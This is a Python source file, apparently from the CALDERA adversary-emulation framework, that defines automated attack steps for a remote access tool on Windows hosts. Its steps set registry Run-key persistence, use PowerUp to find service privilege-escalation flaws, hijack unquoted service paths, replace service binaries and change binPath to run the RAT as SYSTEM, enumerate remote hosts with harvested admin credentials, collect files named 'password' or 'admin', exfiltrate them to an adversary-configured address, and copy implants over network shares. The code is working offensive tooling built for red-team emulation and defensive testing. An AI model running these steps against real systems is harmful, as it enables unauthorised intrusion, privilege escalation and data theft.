        This step creates an entry in the registry under HKU\\<sid>\\Software\\Microsoft\\windows\\CurrentVersion\\Run
        in order to maintain persistence. This results in the RAT being executed whenever a targeted user logs on.
    Requirements:
        Requires enumeration of local profiles on the target machine (done using GetLocalProfiles), and an
        elevated RAT.
    """
    attack_mapping = [('T1060', 'Persistence'), ('T1106', 'Execution')]
    display_name = "hku_runkey_persist"
    summary = ("Use reg.exe to gain persistence by inserting run key values into local user profiles. This will cause "
               "the rat to be executed when any of the affected users logs on")

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host"))),
                     ("user", OPUser({'$in': OPVar("host.local_profiles")}))]

    postconditions = [("regkey_g", OPRegKey({"host": OPVar("host")})),
                      ("persist_g", OPPersistence({"host": OPVar("host"), "user_context": OPVar("user"),
                                                   "elevated": False}))]

    significant_parameters = ["user", "host"]

    postproperties = ["persist_g.regkey_artifact",
                      "regkey_g.key", "regkey_g.value", "regkey_g.data"]

    @staticmethod
    def description(rat, host, user):
        return "Attempting to create a run key on {} for {}".format(host.hostname, user.username)

    @staticmethod
    async def action(operation, rat, host, user, regkey_g, persist_g):
        value = "caldera"
        data = rat.executable

        u_profile_path = "C:\\Users\\{}\\ntuser.dat".format(user.username)  # Assumption: this is where profile path is.
                                                                # TODO: save this info in db during GetLocalProfiles
        u_key = "HKU\\{}".format(user.sid)

        #  Check if user's SID is already in HKU
        key_loaded = False
        relative_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        run_key = u_key + "\\" + relative_key
        loaded = False
        while not loaded:
            try:
                await operation.execute_shell_command(rat, *reg.add(key=run_key, value=value, data=data, force=True))
                loaded = True
            except IncorrectParameterError:  # Load user into HKU
                try:
                    await operation.execute_shell_command(rat, *reg.load(key=u_key, file=u_profile_path))
                    key_loaded = True
                except FileInUseError:
                    log.warning("The hive could not be loaded.")
                    return False

        if key_loaded:  # Unload key (if a key was loaded earlier)
            await operation.execute_shell_command(rat, *reg.unload(key=u_key.format(user.sid)))
            regkey = await regkey_g({'host': host, 'key': relative_key, 'value': value, 'data': data,
                                     'path_to_file': u_profile_path})
        else:
            regkey = await regkey_g({'key': run_key, 'value': value, 'data': data})

        await persist_g({'regkey_artifact': regkey})

        return True

    @staticmethod
    async def cleanup(cleaner, regkey_g):
        for regkey in regkey_g:
            await cleaner.delete(regkey)


class HKLMRunKeyPersist(Step):
    """
    Description:
        This step creates an entry in the registry under the Local Machine hive on a given target machine in order
        to maintain persistence (HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run).
    Requirements:
        Requires an elevated RAT.
    """
    attack_mapping = [('T1060', 'Persistence'), ('T1106', 'Execution')]
    display_name = "hklm_runkey_persist"
    summary = ("Use reg.exe to gain persistence by inserting a run key value into the Local Machine hive (HKLM). This"
               "will cause the rat to be executed in the user context of any user that logs on to the system")

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host")))]

    postconditions = [("regkey_g", OPRegKey),
                      ("persist_g", OPPersistence({"host": OPVar("host"), "elevated": False}))]

    significant_parameters = ["host"]

    preproperties = ["rat.executable"]

    postproperties = ["regkey_g.key", "regkey_g.value", "regkey_g.data",
                      "persist_g.regkey_artifact"]

    @staticmethod
    def description(rat, host):
        return "Creating a local machine run key on {}".format(host.hostname)

    @staticmethod
    async def action(operation, rat, host, regkey_g, persist_g):
        value = "caldera"
        data = rat.executable
        run_key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

        # Add run key
        await operation.execute_shell_command(rat, *reg.add(key=run_key, value=value, data=data, force=True))

        regkey = await regkey_g({'host': host, 'key': run_key, 'value': value, 'data': data})
        await persist_g({'regkey_artifact': regkey})

        return True

    @staticmethod
    async def cleanup(cleaner, regkey_g):
        for regkey in regkey_g:
            await cleaner.delete(regkey)


class GetPrivEscSvcInfo(Step):
    """
    Description:
        This step utilises the PowerUp powershell script to identify potential service-based privilege
        escalation opportunities on a target machine.
    Requirements:
        Requires an non-elevated RAT. This step identifies unquoted service paths, modifiable service targets,
        and modifiable services for privilege escalation purposes.
    """
    attack_mapping = [('T1007', 'Discovery'), ('T1106', 'Execution')]
    display_name = "privilege_escalation(service)"
    summary = "Use PowerUp to find potential service-based privilege escalation vectors"

    preconditions = [("rat", OPRat({"elevated": False})),
                     ("host", OPHost(OPVar("rat.host")))]

    postconditions = [("service_g", OPService({"host": OPVar("host"),
                                               "user_context": OPVar("rat.username")}))]

    @staticmethod
    def description():
        return "Looking for potential privilege escalation vectors related to services"

    @staticmethod
    async def action(operation, rat, host, service_g):
        unquoted = await operation.execute_powershell(rat, "powerup", PSFunction("Get-ServiceUnquoted"),
                                                      parsers.powerup.get_serviceunquoted)
        for parsed_service in unquoted:
            # insert each service into the database
            service_dict = {"name": parsed_service['name'],
                            "bin_path": parsed_service['bin_path'],
                            'service_start_name': parsed_service['service_start_name'],
                            'can_restart': parsed_service['can_restart'],
                            'modifiable_paths': parsed_service['modifiable_paths'],
                            'vulnerability': 'unquoted',
                            'revert_command': ""}
            await service_g(service_dict)
        fileperms = await operation.execute_powershell(rat, "powerup", PSFunction("Get-ModifiableServiceFile"),
                                                       parsers.powerup.get_modifiableservicefile)
        for parsed_service in fileperms:
            service_dict = {'name': parsed_service['name'],
                            'bin_path': parsed_service['bin_path'],
                            'service_start_name': parsed_service['service_start_name'],
                            'can_restart': parsed_service['can_restart'],
                            'modifiable_paths': parsed_service['modifiable_paths'],
                            'vulnerability': 'file',
                            'revert_command': ""}
            await service_g(service_dict)
        mod_bin_path = await operation.execute_powershell(rat, "powerup", PSFunction("Get-ModifiableService"),
                                                          parsers.powerup.get_modifiableservice)
        for parsed_service in mod_bin_path:
            service_dict = {'name': parsed_service['name'],
                            'bin_path': parsed_service['bin_path'],
                            'service_start_name': parsed_service['service_start_name'],
                            'can_restart': parsed_service['can_restart'],
                            'vulnerability': 'bin_path',
                            'revert_command': ""}
            await service_g(service_dict)
        return True


class ServiceManipulateUnquotedLocal(Step):
    """
    Description:
        This step hijacks the search order of an unquoted service path in order to spawn an elevated rat.
    Requirements:
        Requires a non-elevated RAT, and enumeration of unquoted service paths on the target machine (possible
        result of running GetPrivEscSvcInfo).
    """
    attack_mapping = [('T1034', 'Privilege Escalation'), ('T1034', 'Persistence'), ('T1035', 'Execution'), ('T1106', 'Execution')]
    display_name = "service_manipulation(unquoted path)"
    summary = "Abuse unquoted service paths to hijack search order and spawn an elevated rat"

    preconditions = [("host", OPHost),
                     ("rat", OPRat({"elevated": False,
                                     "host": OPVar("host")})),
                     ("service", OPService({'vulnerability': 'unquoted',
                                            'host': OPVar("host"),
                                            'revert_command': "",
                                            'can_restart': True,
                                            'user_context': OPVar("rat.username")}))]
    postconditions = [("rat_g", OPRat({"host": OPVar("host"), "elevated": True})),
                      ("file_g", OPFile({"host": OPVar("host"),
                                         "src_host": OPVar("host"),
                                         "src_path": OPVar("rat.executable"),
                                         'use_case': "rat"})),
                      ("service_g", OPService)]

    @staticmethod
    def description(rat, service, host):
        return "Attempting to abuse {}'s unquoted path on {}".format(service.name, host.hostname)

    @staticmethod
    async def action(operation, rat, service, host, rat_g, service_g, file_g):
        for path in service.modifiable_paths:
            try:
                await operation.execute_shell_command(rat, *cmd.copy(rat.executable, path))
            except (AccessDeniedError, FileInUseError):
                # for some reason we couldn't actually write to "path", move on to the next one
                # or this specific file we're trying to create already exists, so try a different one
                continue
            await file_g({'path': path})
            # if we get here, the copy worked, so now we need to restart the service
            if service.can_restart:
                try:
                    await operation.execute_shell_command(rat, *sc.stop(service.name))
                    await asyncio.sleep(2)  # make sure the service has time to properly stop
                    await operation.execute_shell_command(rat, *sc.start(service.name))
                except ServiceNotStartedError:
                    pass  # this is fine in our case if it isn't already running
                except (AccessDeniedError, ServiceAlreadyRunningError, UnresponsiveServiceError):
                    await service_g({'name': service.name,  # update our service with what we modified
                                     'host': service.host,  # these first three uniquely id this service
                                     'vulnerability': service.vulnerability,
                                     'revert_command': "echo \"Not Vulnerable\""})
                    return False
            else:
                await operation.execute_shell_command(rat, *cmd.shutdown(reboot=True, delay=0, force=True))
                # todo add api to wait for reboot
                await asyncio.sleep(120)  # wait 2 minutes for box to reboot
            await rat_g()
            return True
        # We've gone though all the possible paths and none have worked, mark this as a failure
        await service_g({'name': service.name,  # update our service with what we modified
                         'host': service.host,  # these first three uniquely id this service
                         'vulnerability': service.vulnerability,
                         'revert_command': "echo \"Not Vulnerable\""})
        return False

    @staticmethod
    async def cleanup(cleaner, host, service, file_g):
        # stop the service so we can delete the files
        try:
            await cleaner.run_on_agent(host, *sc.stop(service['name']))
        except ServiceNotStartedError:
            pass
        except CantControlServiceError:
            log.debug("Can't stop {} on {}, so can't delete {}".format(service.name,
                                                                       service.host,
                                                                       file_g[0].path))
        for file in file_g:
            if file['use_case'] == 'rat':
                await cleaner.delete(file)


class ServiceManipulateFileScLocal(Step):
    """
    Description:
        This step hijacks a unprotected service on the target machine by swapping out the target binary with
        a copy of the RAT.
    Requirements:
        Requires a non-elevated RAT, and enumeration of a modifiable service binary on the target machine (possible
        result of running GetPrivEscSvcInfo).
    """
    attack_mapping = [('T1044', 'Privilege Escalation'), ('T1044', 'Persistence'), ('T1035', 'Execution'), ('T1106', 'Execution')]
    display_name = "service_manipulation(sc file replace)"
    summary = "Abuse service file permissions to spawn an elevated rat by swapping out a service's binary"

    preconditions = [("host", OPHost),
                     ("rat", OPRat({"elevated": False,
                                     "host": OPVar("host")})),
                     ("service", OPService({'vulnerability': 'file',
                                            'host': OPVar("host"),
                                            'revert_command': "",
                                            'can_restart': True,
                                            'user_context': OPVar("rat.username")}))]
    postconditions = [("rat_g", OPRat({"host": OPVar("host"), "elevated": True})),
                      ("service_g", OPService),
                      ("file_g", OPFile({"host": OPVar("host"),
                                         "src_host": OPVar("host")}))]

    @staticmethod
    def description(rat, service, host):
        return "Attempting to swap binary of {} with our rat on {}".format(service.name, host.hostname)

    @staticmethod
    async def action(operation, rat, service, host, rat_g, service_g, file_g):
        try:
            # if the service is running, stop it first so we can modify the binary
            state = await operation.execute_shell_command(rat, *sc.query(service.name))
            if state['state'] == "RUNNING":
                try:
                    await operation.execute_shell_command(rat, *sc.stop(service.name))
                    await asyncio.sleep(2)  # make sure the service has time to properly stop
                except ServiceNotStartedError:
                    pass  # this is fine in our case if it isn't already running
            # We need to move the real binary to a different name ( vuln.exe to vuln.exe.bak )
            await operation.execute_shell_command(rat, *cmd.move(service.modifiable_paths[0],
                                                                 service.modifiable_paths[0] + ".bak",
                                                                 suppress_overwrite=True))
            # save off that we moved the file to a new name
            await file_g({'path': service.modifiable_paths[0] + ".bak",
                          'src_path': service.modifiable_paths[0],
                          'use_case': "modified"})
            # Then we need to place a copy of our rat as the vulnerable name
            await operation.execute_shell_command(rat, *cmd.copy(rat.executable, service.modifiable_paths[0]))
            # save off that we put a new file (our rat) on disk
            await file_g({'path': service.modifiable_paths[0],
                          'src_path': rat.executable,
                          'use_case': 'rat'})
            # Lastly, we need a way to restart the service to get our binary to be executed
            if service.can_restart:
                await operation.execute_shell_command(rat, *sc.start(service.name))
            else:
                await operation.execute_shell_command(rat, *cmd.shutdown(reboot=True, delay=0, force=True))
            await rat_g()

        except (AccessDeniedError, NoFileError, FileInUseError): #all possible bad errors should be caught here
            # something went wrong and we can't actually swap out the binary due to acls or can't stop the service
            await service_g({'name': service.name,
                             'host': service.host,
                             'vulnerability': service.vulnerability,
                             'revert_command': "echo \"Not Vulnerable\""})
            return False
        return True

    @staticmethod
    async def cleanup(cleaner, host, service, file_g):
        # stop the service so we can remove the files
        try:
            await cleaner.run_on_agent(host, *sc.stop(service['name']))
        except ServiceNotStartedError:
            pass
        except CantControlServiceError:
            log.debug("Can't stop {} on {}, so can't delete {}".format(service.name,
                                                                       service.host,
                                                                       file_g[0].path))
        for file in file_g:
            if file['use_case'] == 'rat':
                await cleaner.delete(file)  # delete the rat file
        for file in file_g:
            if file['use_case'] == 'modified':
                # fix the original binary that we modified by creating the command we want to execute
                # await cleaner.run_on_agent(host, *cmd.move(file['path'], file['src_path'], True))
                # TODO: Fix the way the planner handles src_path and src_host fields in files!!
                # The following is just a temporary hack to fix
                await cleaner.run_on_agent(host, *cmd.move(file['path'], file['path'][:-4], True))


class ServiceManipulateBinPathScLocal(Step):
    """
    Description:
        This step hijacks a vulnerable service by modifying the target path associated with the binary to point
        to a copy of the RAT.
    Requirements:
        Require a non-elevated RAT, and enumeration of a modifiable service path on the target machine (possible
        result of running GetPriveEscSvcInfo).
    """
    attack_mapping = [('T1058', 'Privilege Escalation'), ('T1058', 'Persistence'), ('T1035', 'Execution'), ('T1106', 'Execution')]
    display_name = "service_manipluation(sc binpath)"
    summary = "Abuse service permissions to spawn an elevated rat by changing a service's binPath"

    preconditions = [("host", OPHost),
                     ("rat", OPRat({"elevated": False,
                                     "host": OPVar("host")})),
                     ("service", OPService({'vulnerability': 'bin_path',
                                            'host': OPVar("host"),
                                            'revert_command': "",
                                            'can_restart': True,
                                            'user_context': OPVar("rat.username")}))]

    postconditions = [("rat_g", OPRat({"host": OPVar("host"), "elevated": True,
                                         "executable": OPVar("rat.executable")})),
                      ("service_g", OPService)]

    @staticmethod
    def description(rat, service, host):
        return "Attempting to change the binPath of {} on {} to our rat".format(service.name, host.hostname)

    @staticmethod
    async def action(operation, rat, service, host, rat_g, service_g):
        try:
            # if the service is running, stop it first so we can modify the binPath
            state = await operation.execute_shell_command(rat, *sc.query(service.name))
            if state['state'] == "RUNNING":
                try:
                    await operation.execute_shell_command(rat, *sc.stop(service.name))
                    await asyncio.sleep(2)  # make sure the service has time to properly stop
                except ServiceNotStartedError:
                    pass  # this is fine in our case if it isn't already running
            # actually modify the binPath and the start_name if needed
            await operation.execute_shell_command(rat, *sc.config(name=service.name, bin_path=rat.executable,
                                                                  start_name="LocalSystem"))
            revert_command = "sc config " + service.name + " binpath= \"" + service.bin_path + "\" obj= " + service.service_start_name
            if service.can_restart is True:
                await operation.execute_shell_command(rat, *sc.start(service.name))
            else:
                await operation.execute_shell_command(rat, *cmd.shutdown(reboot=True, delay=0, force=True))
            await rat_g()
            await service_g({'name': service.name,  # update our service with what we modified
                             'host': service.host,
                             'vulnerability': service.vulnerability,
                             'revert_command': revert_command})
        except AccessDeniedError:
            # something went wrong, not actually vulnerable for some reason
            await service_g({'name': service.name,
                             'host': service.host,
                             'vulnerability': service.vulnerability,
                             'revert_command': 'echo \"Not Vulnerable\"'})
            return False
        return True

    @staticmethod
    async def cleanup(cleaner, host, service):
        # stop the service before we can modify it
        try:
            await cleaner.run_on_agent(host, *sc.stop(service['name']))
        except ServiceNotStartedError:
            pass
        except CantControlServiceError:
            log.debug("Can't stop {} on {}".format(service.name, service.host))
        # now fix the service back to what it was before
        await cleaner.run_on_agent(host, command.CommandLine(service['revert_command']), parsers.sc.config)
        return True


class SysteminfoLocal(Step):
    """
    Description:
        This step enumerates the target machine locally using systeminfo.exe.
    Requirements:
        This step only requires the existence of a RAT on a host in order to run.
    """
    attack_mapping = [("T1082", "Discovery"), ('T1106', 'Execution')]
    display_name = "systeminfo(local)"
    summary = "Use systeminfo.exe to enumerate the local system"

    preconditions = [('rat', OPRat),
                     ('host', OPHost(OPVar('rat.host')))]
    postconditions = [('host_g', OPHost),
                      ("domain_g", OPDomain),
                      ("os_version_g", OPOSVersion)]

    postproperties = ['host_g.hostname', 'host_g.dns_domain_name', 'host_g.fqdn', 'host_g.systeminfo',
                      'host_g.os_version', 'domain_g.windows_domain', 'domain_g.dns_domain']

    significant_parameters = ['host']

    @staticmethod
    def description(rat):
        return "Using systeminfo.exe to enumerate {}".format(rat.host.hostname)

    @staticmethod
    async def action(operation, rat, host, host_g, domain_g, os_version_g):
        info = await operation.execute_shell_command(rat, *systeminfo.csv())

        # Domain info
        await domain_g({'windows_domain': info['Domain'].split('.')[0], 'dns_domain': info['Domain']})

        # Add info about our current host. If we need more host information pulled with systeminfo in the future add it
        # here.
        host_fqdn = '.'.join([info['Host Name'], info['Domain']]).lower()
        # Update the host attributes that we're tracking. Also, save the command result to the database as a text
        # string.
        os_version = await os_version_g({**info['parsed_version_info']})
        await host_g({'hostname': info['Host Name'].lower(), 'dns_domain_name': info['Domain'], 'fqdn': host_fqdn,
                      'system_info': info['_original_text'], 'os_version': os_version})

        # If the RAT is running in a Domain user's context we can find a DC with this (does nothing if we're SYSTEM):
        if info['Logon Server'] != 'N/A':
            logon_server_fqdn = '.'.join([info['Logon Server'].strip('\\\\'), info['Domain']]).lower()
            await host_g({'fqdn': logon_server_fqdn, 'hostname': info['Logon Server'].strip('\\\\').lower(),
                          'dns_domain_name': info['Domain']})

        return True


class SysteminfoRemote(Step):
    """
    Description:
        This step enumerates a target machine located remotely on a network.
    Requirements:
        Requires enumeration of the target host, credentials for an administrator on the target host (needs both
        administrator enumeration 'GetAdmin', and credential data 'Credentials'), and domain enumeration.
    """
    attack_mapping = [("T1082", "Discovery"), ('T1106', 'Execution')]
    display_name = "systeminfo(remote)"
    summary = "Use systeminfo.exe to enumerate a remote system"

    preconditions = [('rat', OPRat),
                     ('host', OPHost(OPVar('rat.host'))),
                     ('dest_host', OPHost),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]
    postconditions = [('host_g', OPHost),
                      ("domain_g", OPDomain),
                      ('os_version_g', OPOSVersion)]

    postproperties = ['host_g.hostname', 'host_g.dns_domain_name', 'host_g.fqdn',
                      'domain_g.windows_domain', 'domain_g.dns_domain', 'host_g.systeminfo', 'host_g.os_version']

    not_equal = [('dest_host', 'rat.host')]

    significant_parameters = ['dest_host']

    @staticmethod
    def description(rat, host, dest_host):
        return "Using systeminfo.exe to remotely enumerate {}".format(dest_host.hostname)

    @staticmethod
    async def action(operation, rat, host, dest_host, cred, user, domain, host_g, domain_g, os_version_g):
        info = await operation.execute_shell_command(rat, *systeminfo.csv(remote_host=dest_host.fqdn,
                                                                          user_domain=domain.windows_domain,
                                                                          user=user.username,
                                                                          password=cred.password))

        # Domain info  -- kind of redundant to leave this in for the remote technique.
        await domain_g({'windows_domain': info['Domain'].split('.')[0], 'dns_domain': info['Domain']})

        # Add info about our current host. If we need more host information pulled with systeminfo in the future add it
        # here.
        host_fqdn = '.'.join([info['Host Name'], info['Domain']]).lower()
        os_version = await os_version_g({**info['parsed_version_info']})
        await host_g({'hostname': info['Host Name'].lower(), 'dns_domain_name': info['Domain'], 'fqdn': host_fqdn,
                      'system_info': info['_original_text'], 'os_version': os_version})

        # If the RAT is running in a Domain user's context we can find a DC with this (does nothing if we're SYSTEM):
        if info['Logon Server'] != 'N/A':
            logon_server_fqdn = '.'.join([info['Logon Server'].strip('\\\\'), info['Domain']]).lower()
            await host_g({'fqdn': logon_server_fqdn, 'hostname': info['Logon Server'].strip('\\\\').lower(),
                          'dns_domain_name': info['Domain']})

        return True


class TasklistLocal(Step):
    """
    Description:
        This step locally enumerates the processes currently running on a target machine using tasklist.exe.
        This enumeration provides information about the processes, as well as associated services and modules.
    Requirements:
        This step only requires the existence of a RAT on a host in order to run.
    """
    attack_mapping = [("T1057", "Discovery"), ("T1007", "Discovery"), ('T1106', 'Execution')]
    display_name = "tasklist(local)"
    summary = "Enumerate process information using tasklist on the local system. The command is run 3 times with the" \
              " /v (verbose), /svc (service) and /m (modules) flags"

    preconditions = [('rat', OPRat),
                     ('host', OPHost(OPVar('rat.host')))]
    postconditions = [("process_g", OPProcess({'$in': OPVar("host.processes")}))]

    postproperties = ['process_g.host', 'host.processes']

    significant_parameters = ['host']

    @staticmethod
    def description(rat):
        return "Using tasklist.exe to enumerate processes on {}".format(rat.host.hostname)

    @staticmethod
    async def action(operation, rat, host, process_g):
        processes = await operation.execute_shell_command(rat, *tasklist.main(verbose=True))

        # Add host to process dictionaries
        [proc.update({'host': host}) for proc in processes]

        is_equivalent = lambda proc1, proc2: True if (proc1['pid'] == proc2['pid'] and
                                                      proc1['image_name'] == proc2['image_name']) else False

        # Add service information to processes (use is_equivalent lambda to look for matching processes)
        service_information = await operation.execute_shell_command(rat, *tasklist.main(services=True))
        [old.update(new) if is_equivalent(old, new) else None for old in processes for new in service_information]
        # TODO: Add service results to Observed_Services in db after change to new technique cleanup is done.

        # Add module information to processes
        modules_information = await operation.execute_shell_command(rat, *tasklist.main(modules=True))
        [old.update(new) if is_equivalent(old, new) else None for old in processes for new in modules_information]

        for proc in processes:
            await process_g(proc)

        return True


class TasklistRemote(Step):
    """
    Description:
        This step enumerates the processes currently running on a remote target machine using tasklist.exe.
        This enumeration provides information about the processes, as well as associated services and modules.
    Requirements:
        Requires enumeration of the target host, domain enumeration, and credentials of an administrator on the
        target machine (needs both administrator enumeration 'GetAdmin', and credential data 'Credentials').
    """
    attack_mapping = [("T1057", "Discovery"), ("T1007", "Discovery"), ('T1106', 'Execution')]
    display_name = "tasklist(remote)"
    summary = "Enumerate process information using tasklist on a remote host. The command is run 3 times with the " \
              "/v (verbose), /svc (service) and /m (modules) flags"

    preconditions = [('rat', OPRat),
                     ('host', OPHost),
                     ("cred", OPCredential({'$in': {'user': OPVar("host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    postconditions = [('process_g', OPProcess),
                      ('host_g', OPHost)]

    postproperties = ['process_g.host', 'host.processes']

    not_equal = [('host', 'rat.host')]

    significant_parameters = ['host']

    @staticmethod
    def description(rat, host):
        return "Using tasklist.exe to remotely enumerate processes on {} from {}".format(host.hostname, rat.host.hostname)

    @staticmethod
    async def action(operation, rat, host, cred, user, domain, process_g, host_g):
        processes = await operation.execute_shell_command(rat, *tasklist.main(verbose=True,
                                                                              remote_host=host.hostname,
                                                                              user_domain=domain.windows_domain,
                                                                              user=user.username,
                                                                              password=cred.password))
        # Add host to process dictionaries
        [proc.update({'host': host}) for proc in processes]

        is_equivalent = lambda proc1, proc2: True if (proc1['pid'] == proc2['pid'] and
                                                      proc1['image_name'] == proc2['image_name']) else False

        # Add service information to processes (use is_equivalent lambda to look for matching processes)
        service_information = await operation.execute_shell_command(rat, *tasklist.main(services=True,
                                                                                        remote_host=host.hostname,
                                                                                        user_domain=domain.windows_domain,
                                                                                        user=user.username,
                                                                                        password=cred.password))
        [old.update(new) if is_equivalent(old, new) else None for old in processes for new in service_information]
        # TODO: Add service results to Observed_Services in db after change to new technique cleanup is done.

        # Add module information to processes
        modules_information = await operation.execute_shell_command(rat, *tasklist.main(modules=True,
                                                                                        remote_host=host.hostname,
                                                                                        user_domain=domain.windows_domain,
                                                                                        user=user.username,
                                                                                        password=cred.password))
        [old.update(new) if is_equivalent(old, new) else None for old in processes for new in modules_information]

        for proc in processes:
            await process_g(proc)

        return True


class DirListCollection(Step):
    """
    Description:
        This step enumerates files on the target machine. Specifically, it looks for files with 'password' or
        'admin' in the name.
    Requirements:
        This step only requires the existence of a RAT on a host in order to run.
    """
    attack_mapping = [("T1005", "Collection"), ("T1083", "Discovery"), ('T1106', 'Execution')]
    display_name = "list_files"
    summary = "Enumerate files locally with a for loop and the dir command recursively"

    preconditions = [('rat', OPRat),
                     ('host', OPHost(OPVar("rat.host")))]

    postconditions = [('file_g', OPFile({'use_case': 'collect',
                                         'host': OPVar("host")}))]

    significant_parameters = ['host']  # no need to do this more than once per host

    postproperties = ['file_g.path']

    @staticmethod
    def description(rat, host):
        return "Using cmd to recursively look for files to collect on {}".format(host.hostname)

    @staticmethod
    async def action(operation, rat, host, file_g):
        # dir path\*word1* /s /b /a-d
        # for now, hard coded list of words we're interested in in file names
        # for now, hard coded list of paths to check for these files
        keywords = ["password", "admin"]
        if "system" in rat.username:
            keypaths = ["C:\\Users\\"]
        else:
            keypaths = ['C:\\Users\\' + rat.username.split("\\")[1] + "\\"]

        for path in keypaths:
            for word in keywords:
                try:
                    # if the b,s, and a flags change on this command, be sure to implement a new parser!
                    files = await operation.execute_shell_command(rat, *cmd.dir_list(search=path + "*" + word + "*",
                                                                                     b=True, s=True, a="-d"))
                    for file in files:
                        await file_g({'path': file})
                except FileNotFoundError:
                    # the path was invalid, the file wasn't found, or access denied, so move on
                    continue

        return True


class ExfilAdversaryProfile(Step):
    """
    Description:
        This step exfiltrates target files on a target machine utilizing the chosen adversary's configured
        exfiltration method.
    Requirements:
        This step requires file enumeration to have taken place (DirListCollection).
    """
    attack_mapping = [("T1048", "Exfiltration"), ('T1106', 'Execution')]
    display_name = "exfiltrate_files"
    summary = "Exfil a set of files over adversary defined exfil method"

    preconditions = [('rat', OPRat),
                     ('host', OPHost(OPVar('rat.host'))),
                     ('file', OPFile({'host': OPVar('rat.host'),
                                      'use_case': 'collect'}))]

    postconditions = [('file_g', OPFile({'host': OPVar('rat.host'),
                                         'use_case': 'exfil',
                                         'path': OPVar('file.path')}))]

    significant_parameters = ['file']  # don't keep exfil-ing the same file
    # TODO: Keep adding to this as more methods are created in crater / web's adversary-form.js

    @staticmethod
    def description(rat, host, file):
        return "exfilling {} from {}".format(file.path, host.hostname)

    @staticmethod
    async def action(operation, rat, host, file, file_g):
        method = operation.adversary_artifactlist.get_exfil_method()
        address = operation.adversary_artifactlist.get_exfil_address()
        port = operation.adversary_artifactlist.get_exfil_port()
        output = await operation.exfil_network_connection(rat, addr=address, port=port, file_path=file.path,
                                                          parser=None, method=method)
        if "Failed to exfil" in output:
            return False
        await file_g()  # create an ObservedFile object for files that we successfully exfilled
        return True


class XCopy(Step):
    """
    Description:
        This step copies a file from a local machine to a remote machine on the network using a share.
    Requirements:
        Requires a pre-existing share on the target remote machine (usually created using NetUse).
    """
    display_name = "xcopy file"
    summary = "Use xcopy.exe to copy a file from a computer to another using a network share"
    attack_mapping = [('T1105', 'Lateral Movement')]

    preconditions = [("rat", OPRat),
                     ("share", OPShare({"src_host": OPVar("rat.host")}))]
    postconditions = [("file_g", OPFile({'host': OPVar("share.dest_host")}))]

    preproperties = ['rat.executable', 'share.share_path']

    deterministic = True

    @staticmethod
    def description(rat, share):
        return "XCopying an implant from {} to {}".format(rat.host.fqdn, share.dest_host.fqdn)

    @staticmethod
    async def action(operation, rat, share, file_g):
        # NOTE: Because of the way XCopy is invoked, we can't tell if it was successful or not by parsing stdout.
        # So, it is assumed that XCopy was successful.
        file_name = operation.adversary_artifactlist.get_executable_word()
        target_path = "{share_path}\\{file_name}".format(share_path=share.share_path, file_name=file_name)
        await operation.execute_shell_command(rat, *xcopy.file(rat.executable, target_path, overwrite_destination=True))
        await file_g({'src_host': share.src_host, 'src_path': rat.executable, 'path': target_path, 'use_case': 'rat'})
        return True

    @staticmethod
    async def cleanup(cleaner, file_g):
        for file in file_g:
            await cleaner.delete(file)


all_steps = Step.__subclasses__()
all_steps.sort(key=(lambda x: x.__name__))
